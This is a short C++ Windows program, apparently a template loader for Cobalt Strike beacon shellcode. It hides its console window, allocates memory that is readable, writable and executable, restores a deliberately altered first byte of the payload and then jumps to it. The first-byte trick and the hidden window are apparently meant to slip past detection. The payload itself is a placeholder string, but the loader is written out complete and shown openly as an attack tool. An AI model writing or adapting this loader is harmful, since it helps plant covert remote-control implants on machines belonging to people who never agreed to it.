#include "stdafx.h"
#include "Windows.h"

int main(int argc, char *argv[]) {
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	// cobalt strike beacon shellcode x64
	unsigned char shellcode[] = "shellcodeWithBadByteAtFirst";
	char first[] = "FirstByte";
	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	memcpy(shellcode, first, 1);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();
	
	return 0;
}
